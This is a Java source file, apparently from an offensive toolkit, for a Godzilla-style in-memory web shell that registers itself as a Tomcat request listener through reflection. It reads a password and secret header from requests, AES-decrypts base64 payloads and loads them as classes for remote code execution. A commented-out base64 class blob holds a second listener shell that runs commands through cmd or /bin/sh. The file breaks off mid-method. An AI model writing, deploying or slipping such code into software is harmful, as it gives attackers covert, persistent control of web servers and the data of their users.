package com.summersec.x;

import com.summersec.attack.utils.Util;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;

public class GodzillaListener extends ClassLoader implements ServletRequestListener {
//    public static String ListenerClass = "yv66vgAAADQB5goAhwDyCADzCQCEAPQIAIsJAIQA9QcA9goABgDyCgAGAPcKAAYA+AoAhAD5CQCEAPoHAPsIAPwKAEkA/QoA/gD/CgD+AQAHAQEHAQIIAQMHAQQIAQUKABIBBggBBwoAIQEICAEJCAEKCgAhAQsIAQwKAQ0BDgoAIQEPCAEQCgAhAREHARIIAKsIARMKARQBFQoBFgEXCgAhARgIARkIARoHARsKARwBHQoBHAEeCgEfASAKACkBIQgBIgoAKQEjCgApASQKABQBJQoBJgEnCAEoCgASASkIASoKACEBKwcBLAoANwDyCgASAS0KADcBLggArgoAEgEvCgEwATEIATILATMBNAgBNQoBNgE3BwE4CgAhATkKAEIBOgoBNgE7CAE8CgBJAT0IAT4HAT8HALYJAUABQQoASQFCCgFDAP8HAUQKAE4A8goATgFFCgE2AUYKAUcBSAoBRwFJBwFKCgFAAUsKAUMBTAoASQFNCgBUASsIAU4KABIBTwoAhAFQCgCEAVEJAIQBUgcBUwcBVAoAXgFVBwFWBwFXCgBiAPIKACEBWAoBJgFZCgBUAPgKAGIBWgoAhAFbCgAhAVwHAV0IAV4IAV8KAEkBYAoAVAFhCAFiCAFjCAFkCAFlCAFmCAFnCAFoCAFpCgFqAWsKACEBbAoBagFtBwFuCgFqAW8KAHoBcAoAegFxCgAhAXIHAXMIAOwHAXQIAXUHAXYHAXcKAIQA8goAgwF4BwF5BwF6AQACeGMBABJMamF2YS9sYW5nL1N0cmluZzsBAARwYXNzAQADbWQ1AQAHcGF5bG9hZAEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACJMVG9tY2F0TGlzdGVuZXJNZW1zaGVsbEZyb21UaHJlYWQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAXsBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAEHJlcXVlc3REZXN0cm95ZWQBACYoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudDspVgEAE3NlcnZsZXRSZXF1ZXN0RXZlbnQBACNMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OwEAEnJlcXVlc3RJbml0aWFsaXplZAEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAGcmVzdWx0AQADY21kAQALcGFnZUNvbnRleHQBABNMamF2YS91dGlsL0hhc2hNYXA7AQAHc2Vzc2lvbgEAIExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQABawEAAWMBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAZtZXRob2QBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADmV2aWxjbGFzc19ieXRlAQACW0IBAAlldmlsY2xhc3MBAA51cmxDbGFzc0xvYWRlcgEAGUxqYXZhL25ldC9VUkxDbGFzc0xvYWRlcjsBAAlkZWZNZXRob2QBAAZhcnJPdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQABZgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABGRhdGEBABJyZXF1ZXN0RmFjYWRlRmllbGQBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQANcmVxdWVzdEZhY2FkZQEALUxvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0RmFjYWRlOwEAFWNvbm5lY3RvclJlcXVlc3RGaWVsZAEAEGNvbm5lY3RvclJlcXVlc3QBACdMb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdDsBABZjb25uZWN0b3JSZXNwb25zZUZpZWxkAQARY29ubmVjdG9yUmVzcG9uc2UBAChMb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVzcG9uc2U7AQANU3RhY2tNYXBUYWJsZQcBdwcA+wcBfAcBAQcBAgcBBAcBEgcAqQcBXQEAAXgBAAcoW0JaKVtCAQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAAXMBAAFtAQABWgcBfQEADGJhc2U2NERlY29kZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAAdkZWNvZGVyAQAGYmFzZTY0AQACYnMBAAV2YWx1ZQEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAA3JldAEACDxjbGluaXQ+AQAVd2ViYXBwQ2xhc3NMb2FkZXJCYXNlAQAyTG9yZy9hcGFjaGUvY2F0YWxpbmEvbG9hZGVyL1dlYmFwcENsYXNzTG9hZGVyQmFzZTsBAA5yZXNvdXJjZXNGaWVsZAEACXJlc291cmNlcwEAFHN0YW5kYXJkQ29udGV4dEZpZWxkAQAPc3RhbmRhcmRDb250ZXh0AQAqTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9TdGFuZGFyZENvbnRleHQ7AQAKU291cmNlRmlsZQEAJVRvbWNhdExpc3RlbmVyTWVtc2hlbGxGcm9tVGhyZWFkLmphdmEMAI8AkAEAEDU1OTdjNzAxNjZlNDFkM2EMAIkAigwAiwCKAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAX4BfwwBgAGBDACMAOUMAIwAigEAIWphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudAEAB3JlcXVlc3QMAYIBgwcBfAwBhAGFDAGGAYcBACtvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0RmFjYWRlAQAlb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdAEACHJlc3BvbnNlAQAmb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVzcG9uc2UBABB4LWNsaWVudC1yZWZlcmVyDAGIAOUBABVodHRwOi8vd3d3LmJhaWR1LmNvbS8MAYkBigEADXgtY2xpZW50LWRhdGEBAAh0ZXN0enhjdgwBiwGMAQAHb3MubmFtZQcBjQwBjgDlDAGPAYEBAAN3aW4MAZABkQEAEGphdmEvbGFuZy9TdHJpbmcBAAIvYwcBkgwBXwGVBwGWDAFiAN0MAI8BlwEABy9iaW4vc2gBAAItYwEAEWphdmEvdXRpbC9TY2FubmVyBwGYDAGZAZoMAZsBnAcBnQwBngGfDACPAaABAAJcQQwBoQGiDAGjAYEMAaQBpQcBpgwBpwGoAQAIYmVoaW5kZXIMAakBgQEABFBPU1QMAaoBqwEAEWphdmEvdXRpbC9IYXNoTWFwDAGsAa0MAa4BrwwBsAGxBwGyDAGzAYEBAAF1BwG0DAG1AbYBAANBRVMHAX0MAbcBuAEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMMAbkBugwAjwG7DAG8Ab0BABVqYXZhLmxhbmcuQ2xhc3NMb2FkZXIMAb4BvwEAC2RlZmluZUNsYXNzAQAPamF2YS9sYW5nL0NsYXNzBwHADAHBAI4MAcIBwwcBxAEAFnN1bi9taXNjL0JBU0U2NERlY29kZXIMAWQA3QwBxQHGBwHHDAHIAckMAcoBywEAEGphdmEvbGFuZy9PYmplY3QMAcwBzQwBzgHPDAHQAdEBAAhnb2R6aWxsYQwB0gDlDADcAN0MANQA1QwAjQCOAQAXamF2YS9uZXQvVVJMQ2xhc3NMb2FkZXIBAAxqYXZhL25ldC9VUkwMAI8B0wEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtDAHUAdUMAdYBqAwB1wG6DADiAOMMAdQB2AEAE2phdmEvbGFuZy9FeGNlcHRpb24BABBqYXZhLnV0aWwuQmFzZTY0AQAKZ2V0RGVjb2RlcgwBqQHDDAHZAdoBAAZkZWNvZGUBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyAQAKZ2V0RW5jb2RlcgEADmVuY29kZVRvU3RyaW5nAQAWc3VuLm1pc2MuQkFTRTY0RW5jb2RlcgEABmVuY29kZQEAA01ENQcB2wwBtwHcDAHdAd4MAd8B4AEAFGphdmEvbWF0aC9CaWdJbnRlZ2VyDAHhAboMAI8B4gwBgAHYDAHjAYEBADBvcmcvYXBhY2hlL2NhdGFsaW5hL2xvYWRlci9XZWJhcHBDbGFzc0xvYWRlckJhc2UBAC1vcmcvYXBhY2hlL2NhdGFsaW5hL3dlYnJlc291cmNlcy9TdGFuZGFyZFJvb3QBAAdjb250ZXh0AQAob3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL1N0YW5kYXJkQ29udGV4dAEAIFRvbWNhdExpc3RlbmVyTWVtc2hlbGxGcm9tVGhyZWFkDAHkAeUBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAkamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdExpc3RlbmVyAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0SGVhZGVyAQAQZXF1YWxzSWdub3JlQ2FzZQEAFShMamF2YS9sYW5nL1N0cmluZzspWgEAB2lzRW1wdHkBAAMoKVoBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAQamF2YS91dGlsL0Jhc2U2NAEAB0RlY29kZXIBAAxJbm5lckNsYXNzZXMBABwoKUxqYXZhL3V0aWwvQmFzZTY0JERlY29kZXI7AQAYamF2YS91dGlsL0Jhc2U2NCREZWNvZGVyAQAFKFtCKVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABG5leHQBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAJZ2V0TWV0aG9kAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAKZ2V0U2Vzc2lvbgEAIigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAANwdXQBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACWdldFJlYWRlcgEAGigpTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEACHJlYWRMaW5lAQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAIcHV0VmFsdWUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAARpbml0AQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEAEWphdmEvbGFuZy9JbnRlZ2VyAQAEVFlQRQEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAB2RvRmluYWwBAAYoW0IpW0IBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7AQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEADGdldFBhcmFtZXRlcgEAKShbTGphdmEvbmV0L1VSTDtMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQAJc3Vic3RyaW5nAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwEABXdyaXRlAQALdG9CeXRlQXJyYXkBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABtqYXZhL3NlY3VyaXR5L01l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";

    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    String xc = "3c6e0b8a9c15224a";
    public String Pwd = "pass1024";
    String md5;
    String randomHeader = "default";
    public String cs = "UTF-8";

    public GodzillaListener() {
        this.md5 = md5(this.Pwd + this.xc);
        this.cs = "UTF-8";
    }

    public GodzillaListener(ClassLoader z) {
        super(z);
        this.md5 = md5(this.Pwd + this.xc);
        this.cs = "UTF-8";
    }


    public static String md5(String s) {
        String ret = null;

        try {
            MessageDigest m = MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = (new BigInteger(1, m.digest())).toString(16).toUpperCase();
        } catch (Exception var3) {
        }

        return ret;
    }

    public boolean equals(Object obj) {
        this.parseObj(obj);
        this.Pwd = this.request.getHeader("p");
        this.randomHeader = this.request.getHeader("h");
        this.md5 = md5(this.Pwd + this.xc);
        StringBuffer output = new StringBuffer();
        String tag_s = "->|";
        String tag_e = "|<-";

        try {
            this.response.setContentType("text/html");
            this.request.setCharacterEncoding(this.cs);
            this.response.setCharacterEncoding(this.cs);
            output.append(this.addListener());
        } catch (Exception var7) {
            output.append("error:" + var7.toString());
        }

        try {
            this.response.getWriter().print(tag_s + output.toString() + tag_e);
            this.response.getWriter().flush();
            this.response.getWriter().close();
        } catch (Exception var6) {
        }

        return true;
    }

    public Class Q(byte[] cb) {
        return super.defineClass(cb, 0, cb.length);
    }

    public void parseObj(Object obj) {
        if (obj.getClass().isArray()) {
            Object[] data = (Object[])((Object[])obj);
            this.request = (HttpServletRequest)data[0];
            this.response = (HttpServletResponse)data[1];
        } else {
            try {
                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
                this.request = (HttpServletRequest)clazz.getDeclaredMethod("getRequest").invoke(obj);
                this.response = (HttpServletResponse)clazz.getDeclaredMethod("getResponse").invoke(obj);
            } catch (Exception var8) {
                if (obj instanceof HttpServletRequest) {
                    this.request = (HttpServletRequest)obj;

                    try {
                        Field req = this.request.getClass().getDeclaredField("request");
                        req.setAccessible(true);
                        HttpServletRequest request2 = (HttpServletRequest)req.get(this.request);
                        Field resp = request2.getClass().getDeclaredField("response");
                        resp.setAccessible(true);
                        this.response = (HttpServletResponse)resp.get(request2);
                    } catch (Exception var7) {
                        try {
                            this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                        } catch (Exception var6) {
                        }
                    }
                }
            }
        }

    }

    public byte[] x(byte[] s, boolean m) {
        try {
            Cipher c = Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new SecretKeySpec(xc.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }

    public String addListener() throws Exception {
        ServletContext servletContext = this.request.getServletContext();
        Field contextField = servletContext.getClass().getDeclaredField("context");
        contextField.setAccessible(true);
        ApplicationContext applicationContext = (ApplicationContext)contextField.get(servletContext);
        contextField = applicationContext.getClass().getDeclaredField("context");
        contextField.setAccessible(true);
        StandardContext standardContext = (StandardContext)contextField.get(applicationContext);

        standardContext.addApplicationEventListener(this);
        return "Success";
    }

    public static byte[] base64Decode(String bs) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }

    public static String base64Encode(byte[] bs) throws Exception {
        Class base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }

    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        try {
            request.setCharacterEncoding(this.cs);
            response.setCharacterEncoding(this.cs);
            // 入口
            if (request.getHeader(randomHeader).equals(randomHeader)) {
                HttpSession session = request.getSession();
                byte[] data = base64Decode(request.getParameter(Pwd));
                data = this.x(data, false);
                if (session.getAttribute("payload") == null) {
                    session.setAttribute("payload", (new GodzillaListener(this.getClass().getClassLoader())).Q(data));
                } else {
                    request.setAttribute("parameters", data);
                    java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
